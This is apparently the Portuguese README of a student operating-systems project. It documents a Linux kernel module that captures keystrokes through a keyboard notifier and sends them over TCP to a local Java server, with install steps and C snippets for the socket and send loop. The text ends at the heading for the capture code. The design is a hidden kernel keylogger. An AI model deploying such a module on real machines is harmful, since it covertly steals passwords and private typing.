# **Whisper Driver - escaneador em kernel com comunicação TCP.**

Trabalho da disciplina de Sistemas Operacionais I (SSC0640), lecionada pelo Docente Vanderlei Bonato, para o curso de Engenharia de Computação - USP São Carlos.


Por: **Caio O. Godinho**, **Hugo H. Nakamura** e **Isaac S. Soares**.

---

**Esse código foi realizado e executado na distribuição de Linux Ubuntu 23.04. Em outros sistemas derivados, algumas execuções podem não funcionar!**

## **1. Composição do projeto.**
O projeto foi desenvolvido com o propósito de ser um driver de kernel capaz de escanear as teclas do teclado e enviar a um usuário externo conectado, funcionando por trás do uso principal do sistema.

Dessa forma, o usuário externo é um servidor, implementado em **user space** na linguagem Java, com interface JavaFX. O driver é um módulo kernel, com um listener de teclas e um socket de cliente, implementado em C no **kernel space**.

## **2. Requisitos**
* Apache ant;
* JDK Java 8 com javaFX;
* Arquivos headers de kernel;

## **3. Instalação dos requisitos.**
### **3.1. Java JDK 8 e Apache Ant**
A execução do servidor depende do compilador Apache Ant. Caso você não possua instalado, basta copiar o código abaixo no terminal e executar.

```
$ sudo apt install ant
```

Também é preciso ter o pacote de desenvolvedor Java 8. No site oficial da Oracle "https://www.oracle.com/br/java/technologies/javase/javase8-archive-downloads.html" você pode baixar o binário do **Java SE Development Kit 8u202** e executar no terminal

```
$ sudo tar -C /usr/java -zxf <nome do arquivo binário>.tar.gz
```

### **3.2. Arquivos headers de kernel.**

Para saber se essas bibliotecas estão instaladas no seu sistema, execute

```
$ uname -r
$ apt search linux-headers-$(uname -r)
```

Caso você não tenha as bibliotecas, execute

```
$ sudo apt-get install build-essential linux-headers-`uname -r`
```

## **4. Guia de execução.**

1. Compile todos os arquivos executando:
```
$ make
```
2. Abra o servidor executando:

```
$ make start
```
3. Com o servidor aberto, é preciso pressionar **"Abrir servidor"**, para que ele comece a aceitar conexões. Nessa etapa, é importante verificar se o IP é **127.0.0.1** e a porta **8008**.

4. Agora deve-se inserir o módulo no kernel com:

```
$ make insert
```

5. Com o módulo no kernel, ele se conectará automaticamente e o servidor começará a mostrar as teclas digitadas pelo usuário. Para retirar o módulo do kernel, execute

```
$ make remove
```

## **5. Resumo do driver.**

### **5.1. Conexão do cliente com o servidor.**
A rotina de conexão com o servidor é a primeira rotina executada ao ínicio do módulo. Nela, define-se o IP e configura a conexão. Depois conecta-se o socket do cliente ao servidor. No trecho abaixo, há apenas a parte principal da rotina.

```
//Define o endereço de IP.
unsigned char ip[5] = {127,0,0,1,'\0'};

//Reserva memória no endereço 'endereco'.
memset(&endereco, 0, sizeof(endereco));

//Configura a conexão com o endereço IPV4, na porta 8008 no IP definido.
endereco.sin_family = AF_INET;
endereco.sin_port = htons(8008);
endereco.sin_addr.s_addr = htonl(criaEndereco(ip));

//Conecta o cliente ao servidor externo.
socket->ops->connect(socket, (struct sockaddr*)&endereco, sizeof(endereco), O_RDWR);

//Iniciar o notifier do teclado.
register_keyboard_notifier(&keysniffer_blk);

```


### **5.2. Rotinas de envio de mensagem.**
O envio de mensagem acontece byte-a-byte. Recebendo uma mensagem como parâmetro, a rotina de envio cria estruturas de mensagem, **struct msghdr**, e de buffer, **struct kvec**. Assim, envia-se um byte da mensagem até que o retorno da função **kernel_send** seja 0.

```
//Cria a struct do tipo msghdr (mensagem) e kvec (buffer).
struct msghdr msg;
struct kvec vec;

//Define o struct de mensagem.
msg.msg_name = 0;
msg.msg_namelen = 0;
msg.msg_control = NULL;
msg.msg_controllen = 0;
msg.msg_flags = flags;

//Enviar a mensagem ao servidor.
while(1){
    //Estrutura de buffer.
    vec.iov_len = left;
    vec.iov_base = (char *)mensagem + written;

    //Retorna o número de bytes enviados.
    len = kernel_sendmsg(localSocket, &msg, &vec, left, left);

    //Ao receber constantes do sistema, ignora e prossegue enviando.
    if(len == -ERESTARTSYS || !(flags & MSG_DONTWAIT) && len == -EAGAIN)
        continue;

    //Caso ainda haja bytes para enviar.
    if(len > 0){
        written += len;
        left -= len;
        if(left)
            continue;
    }
    break;
}
```

### **5.3. Listener das teclas**
